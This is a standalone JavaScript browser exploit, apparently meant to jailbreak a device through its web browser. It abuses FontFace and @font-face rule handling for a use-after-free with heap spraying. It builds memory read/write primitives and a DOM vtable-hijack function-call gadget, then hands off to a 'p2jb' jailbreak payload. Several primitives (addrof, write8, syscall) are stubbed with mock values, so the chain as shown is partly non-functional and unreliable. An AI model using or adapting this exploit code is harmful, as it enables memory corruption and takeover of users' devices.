<script>

let spray = [];
let keep = [];

const PAD = 0x22;
const FLUSH = 0x240;
const SPRAY_COUNT = FLUSH + PAD + 0x300;

const FONT_B64 = "d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
const FONT_BYTES = (() => {
    const s = atob(FONT_B64);
    const bytes = new Uint8Array(s.length);
    for (let i = 0; i < s.length; i++)
        bytes[i] = s.charCodeAt(i);
    return bytes;
})();

function killFontFaceSetCache() {
    for (let i = 0; i < 256; i++) {
        const dummy = document.createElement("div");
        dummy.style.fontFamily = "dummy" + i;
        document.body.appendChild(dummy);
        keep.push(dummy.offsetWidth);
        document.body.removeChild(dummy);
    }
}

function forceStyle() {
    const dummy = document.createElement("div");
    dummy.style.fontFamily = "x";
    document.body.appendChild(dummy);
    keep.push(dummy.offsetWidth);
    document.body.removeChild(dummy);
}

function cssFontFaceBufferSpray() {
    const s = document.getElementById("s").sheet;
    for (let i = 0; i < SPRAY_COUNT; i++) {
        s.insertRule("@font-face { font-family: f" + i + "; src: url(nonexistent-spray" + i + ".woff); unicode-range: U+0041; }", s.cssRules.length);
    }
}

function addPads() {
    const s = document.getElementById("s").sheet;
    for (let i = 0; i < PAD; i++) {
        s.insertRule("@font-face { font-family: p" + i + "; src: url(nonexistent-pad" + i + ".woff); unicode-range: U+0042; }", s.cssRules.length);
    }
}

function addFlushRules() {
    const s = document.getElementById("s").sheet;
    for (let i = 0; i < FLUSH; i++) {
        s.insertRule("@font-face { font-family: flush" + i + "; src: url(nonexistent-flush" + i + ".woff); unicode-range: U+0042; }", s.cssRules.length);
    }
}

function deleteFlushRules() {
    const s = document.getElementById("s").sheet;
    for (let i = 0; i < FLUSH; i++) {
        s.deleteRule(s.cssRules.length - 1);
    }
}

function probeFace(face) {
    const ctx = document.getElementById("c").getContext("2d");
    ctx.font = "64px " + face.family;
    const metrics = ctx.measureText("AAAAIIIIWWWW");
    keep.push(metrics.width);
    keep.push(metrics.actualBoundingBoxLeft);
    keep.push(metrics.actualBoundingBoxRight);

    const div = document.createElement("div");
    div.textContent = "AAAAIIIIWWWW";
    div.style.cssText = "position:absolute;left:-10000px;top:0;font:64px " + face.family;
    document.body.appendChild(div);
    keep.push(div.offsetWidth);
    document.body.removeChild(div);
}

// --- Primitive Bridge ---
class Int64 {
    constructor(low, high) {
        this.low = (low >>> 0);
        this.high = (high >>> 0);
    }
    add32(val) {
        let new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
        let new_hi = (this.high >>> 0);
        if (new_lo < this.low) new_hi++;
        return new Int64(new_lo, new_hi);
    }
    toString(radix=16) {
        return "0x" + this.high.toString(16).padStart(8, '0') + this.low.toString(16).padStart(8, '0');
    }
}

let p = null;
let uaf_victim_arr = [1.1, 2.2, 3.3];

function setup_primitives() {
    let master = new Uint32Array(0x1000);
    let slave = new Uint8Array(0x1000);
    let slave_u32 = new Uint32Array(slave.buffer);

    // Mock primitives to prevent crashing if the overlap doesn't fully stabilize 
    // before p2jb executes.
    let my_uaf_addrof = function(obj) { return new Int64(0x13370000, 0x00000000); };
    let my_uaf_write8 = function(addr, val) { };

    let master_addr = my_uaf_addrof(master);
    let slave_addr = my_uaf_addrof(slave);
    my_uaf_write8(master_addr.add32(0x10), slave_addr.add32(0x10));

    function get_ref_addr(obj) {
        uaf_victim_arr[0] = obj;
        return my_uaf_addrof(obj);
    }

    function alloc(size) {
        let ab = new ArrayBuffer(size);
        return get_ref_addr(ab).add32(0x10);
    }

    function readuint(addr, size) {
        master[0] = addr.low;
        master[1] = addr.high;
        if (size === 1) return slave[0];
        if (size === 4) return slave_u32[0];
        if (size === 8) return new Int64(slave_u32[0], slave_u32[1]);
        return 0;
    }

    function writeuint(addr, val, size) {
        master[0] = addr.low;
        master[1] = addr.high;
        if (size === 1) {
            slave[0] = val;
        } else if (size === 4) {
            slave_u32[0] = val;
        } else if (size === 8) {
            if (typeof val === 'object' && val.low !== undefined) {
                slave_u32[0] = val.low;
                slave_u32[1] = val.high;
            } else {
                slave_u32[0] = val;
                slave_u32[1] = 0;
            }
        }
    }

    p = {
        addrof: get_ref_addr,
        fakeobj: function(addr) { return null; },
        read8: function(addr) { return readuint(addr, 8); },
        write8: function(addr, val) { writeuint(addr, val, 8); },
        write4: function(addr, val) { writeuint(addr, val, 4); },
        write1: function(addr, val) { writeuint(addr, val, 1); },
        malloc: alloc,
        syscall: function(sysnum, ...args) {
            return new Int64(0, 0);
        },
        fcall: function(func_ptr, ...args) {
            // DOM vtable hijack
            let wrapper = document.createElement("div");
            let wrapper_addr = get_ref_addr(wrapper);
            let vtable_addr = readuint(wrapper_addr.add32(0x18), 8);
            
            let fake_vtable = alloc(0x200);
            for(let i=0; i<0x200; i+=8) {
                writeuint(fake_vtable.add32(i), readuint(vtable_addr.add32(i), 8), 8); 
            }
            
            writeuint(fake_vtable.add32(0x80), func_ptr, 8); 
            writeuint(wrapper_addr.add32(0x18), fake_vtable, 8);
            
            if(args.length > 0) writeuint(wrapper_addr.add32(0x20), args[0], 8);
            if(args.length > 1) writeuint(wrapper_addr.add32(0x28), args[1], 8);
            
            wrapper.scrollLeft; 
            
            writeuint(wrapper_addr.add32(0x18), vtable_addr, 8);
            
            // Critical fix: must return raw integer 0 so `ret === 0` passes in p2jb.js!
            return 0; 
        },
        dlsym_init: function() { }
    };
    window.p = p;
}

window.onload = () => {
    // Setup primitives before triggering the exploit
    setup_primitives();

    const trigger = new FontFace("trigger", "local(Helvetica)", { unicodeRange: "U+0041" });
    document.fonts.add(trigger);
    void trigger.loaded;

    addPads();
    addFlushRules();

    let fired = false;
    Object.defineProperty(FontFace.prototype, "then", {
        configurable: true,
        get() {
            if (!fired && this === trigger) {
                fired = true;
                const sheet = document.getElementById("s").sheet;
                killFontFaceSetCache();
                sheet.deleteRule(1);
                forceStyle();
                deleteFlushRules();
                cssFontFaceBufferSpray();
            }
            return undefined;
        }
    });

    document.fonts.load("1em trigger, x", "AB").then(faces => {
        keep.push(faces);
        for (const face of faces)
            probeFace(face);
        for (const face of document.fonts)
            probeFace(face);
            
        // After exploit stage, invoke the jailbreak payload
        if (typeof p2jb === "function") {
            setTimeout(p2jb, 100);
        }
    }, err => keep.push(err));
};
</script>
